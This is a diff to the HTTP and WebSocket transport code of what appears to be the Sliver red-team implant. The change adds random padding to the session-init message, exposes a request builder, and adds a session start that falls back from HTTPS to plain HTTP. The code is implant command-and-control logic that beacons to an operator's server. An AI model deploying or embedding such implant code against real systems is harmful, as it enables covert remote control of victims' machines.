@@ -173,11 +173,20 @@ type SliverHTTPClient struct {
 	Options *HTTPOptions
 }
 
+func (s *SliverHTTPClient) GetCookieJar() http.CookieJar {
+	_client, ok := s.driver.(*http.Client)
+	if !ok {
+		return nil
+	}
+	return _client.Jar
+}
+
 // SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
 	sKey := cryptography.RandomSymmetricKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
-	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
+	r := insecureRand.New(insecureRand.NewSource(time.Now().UnixNano())).Intn(2000) + 1000
+	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:], Buffer: make([]byte, r)}
 	data, _ := proto.Marshal(httpSessionInit)
 
 	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
@@ -224,7 +233,7 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 	return uri
 }
 
-func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
+func (s *SliverHTTPClient) NewHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
 	if s.Options.HostHeader != "" {
 		req.Host = s.Options.HostHeader
@@ -362,7 +371,7 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
 
-	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
+	req := s.NewHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
 	// {{end}}
@@ -429,7 +438,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	uri := s.parseSegments(0)
 	nonce, encoder := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	req := s.NewHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
@@ -511,7 +520,7 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
 	// {{end}}
 
-	req := s.newHTTPRequest(http.MethodPost, uri, reader)
+	req := s.NewHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.driver.Do(req)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST request completed")
@@ -552,7 +561,7 @@ func (s *SliverHTTPClient) CloseSession() error {
 	uri := s.parseSegments(2)
 	nonce, _ := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	req := s.NewHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
@@ -631,7 +640,7 @@ func (s *SliverHTTPClient) parseSegments(segmentType int) *url.URL {
 	case 1:
 		curl.Path = s.pathJoinURL(s.randomPath(sessionPaths, sessionFiles, "{{ .HTTPC2ImplantConfig.SessionFileExtension }}"))
 	case 2:
-		curl.Path = s.pathJoinURL(s.randomPath(closePaths, closeFiles, "{{.HTTPC2ImplantConfig.CloseFileExtension}}"))
+		curl.Path = s.pathJoinURL(s.randomPath(closePaths, closeFiles, "{{ .HTTPC2ImplantConfig.CloseFileExtension }}"))
 	default:
 		return nil
 	}
@@ -706,6 +715,55 @@ func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
 		Options:   opts,
 	}
 	return client
+}
+
+// WsSessionInit - Initialize the WebSocket session
+func (s *SliverHTTPClient) WsSessionInit() error {
+	uri := s.parseSegments(0)
+	req := s.NewHTTPRequest(http.MethodGet, uri, nil)
+	// {{if .Config.Debug}}
+	log.Printf("[ws] Get -> %s ", uri)
+	// {{end}}
+	_, err := s.driver.Do(req)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[ws-http] failed to initialize driver: %v", err)
+		// {{end}}
+		return err
+	}
+	return nil
+}
+
+// WebSocketStartSession - Attempts to start a session with a given address
+func WebSocketStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
+	var client *SliverHTTPClient
+	var err error
+	if !opts.ForceHTTP {
+		client = httpsClient(address, opts)
+		client.Options = opts
+		client.PathPrefix = pathPrefix
+		err = client.SessionInit()
+		//err = client.WsSessionInit()
+		if err == nil {
+			return client, nil
+		}
+	}
+	if err != nil || opts.ForceHTTP {
+		// If we're using default ports then switch to 80
+		if strings.HasSuffix(address, ":443") {
+			address = fmt.Sprintf("%s:80", address[:len(address)-4])
+		}
+		opts.ForceHTTP = true
+		client = httpClient(address, opts)
+		client.Options = opts
+		client.PathPrefix = pathPrefix
+		err = client.SessionInit()
+		//err = client.WsSessionInit()
+		if err != nil {
+			return nil, err
+		}
+	}
+	return client, nil
 }
 
 // {{end}} -IncludeHTTP
